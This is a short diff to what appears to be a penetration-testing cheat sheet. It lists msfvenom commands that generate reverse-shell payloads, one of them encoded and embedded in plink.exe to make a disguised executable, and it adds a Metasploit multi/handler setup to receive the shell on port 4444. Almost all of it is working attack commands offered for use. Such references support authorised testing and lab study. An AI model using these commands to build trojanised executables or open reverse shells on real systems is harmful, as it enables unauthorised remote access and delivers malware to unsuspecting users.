@@ -20,3 +20,10 @@ msfvenom -p linux/x86/shell/reverse_tcp LLHOST=10.10.10.101 LPORT=4444 -f exe -e
 # INJECT an encoded payload to an executable
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/plink.exe -o
 reverse_shell_encoded_embedded.exe
+
+# Multi handler
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 4444
+exploit -j -z
